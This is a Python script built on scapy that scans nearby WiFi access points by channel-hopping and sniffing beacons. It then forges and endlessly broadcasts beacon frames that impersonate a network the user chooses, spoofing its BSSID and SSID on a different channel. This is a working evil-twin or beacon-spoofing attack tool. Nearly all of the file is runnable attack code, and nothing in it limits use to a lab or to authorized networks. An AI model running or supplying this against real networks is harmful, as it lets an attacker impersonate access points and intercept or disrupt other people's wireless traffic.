from scapy.all import *
from threading import Thread
import pandas
import time
import os

# source code : https://www.thepythoncode.com/code/building-wifi-scanner-in-python-scapy

# initialize the networks dataframe that will contain all access points nearby
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap

networks = pandas.DataFrame(columns=["BSSID", "SSID", "Signal (dBm)", "Channel"])
# set the index BSSID (MAC address of the AP)
networks.set_index("BSSID", inplace=True)


def callback(packet):
    if packet.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        ssid = packet[Dot11Elt].info.decode()
        try:
            dbm_signal = packet.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = packet[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        networks.loc[bssid] = (ssid, dbm_signal, channel)


def print_all(stop):
    while True:
        os.system("clear")
        print(networks)
        print("Sniffing will end after 10 seconds...")
        time.sleep(0.5)

        if stop():
            break


def change_channel(stop):
    ch = 1
    while True:
        os.system(f"iwconfig {interface} channel {ch}")
        # switch channel from 1 to 14 each 0.5s
        ch = ch % 14 + 1
        time.sleep(0.5)

        if stop():
            break


if __name__ == "__main__":
    # interface name, check using iwconfig
    interface = "wlan0"
    stop_threads = False
    # start the thread that prints all the networks
    printer = Thread(target=print_all, args=(lambda: stop_threads,))
    printer.daemon = True
    printer.start()
    # start the channel changer
    channel_changer = Thread(target=change_channel, args=(lambda: stop_threads,))
    channel_changer.daemon = True
    channel_changer.start()
    # start sniffing
    sniff(prn=callback, iface=interface, timeout=10)
    # stop threads used for sniffing
    stop_threads = True
    printer.join()
    channel_changer.join()

    if networks.empty:
        print("There is no networks nearby")
    else:
        chosen_bssid = input("Please choose a network to impersonate by entering its BSSID : ")
        ssid, dbm_signal, channel = networks.loc[chosen_bssid]

        # choose a channel 6 channels away from the original network
        channel = (channel + 6) % 14

        # forging a beacon with type 1 and subtype 8 (Management frame and Beacon), broadcast address as
        # destination address, chosen BSSID as the sender address and AP address
        packet = RadioTap() \
                 / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=chosen_bssid, addr3=chosen_bssid) \
                 / Dot11Beacon() \
                 / Dot11Elt(ID="SSID", info=ssid, len=len(ssid)) \
                 / Dot11Elt(ID="DSset", info=chr(channel))

        # sending beacon every 100 ms forever
        print(f"\nSending beacon of network {ssid} on channel {channel} until CTRL+C is pressed...")
        sendp(packet, inter=0.1, iface=interface, loop=1)
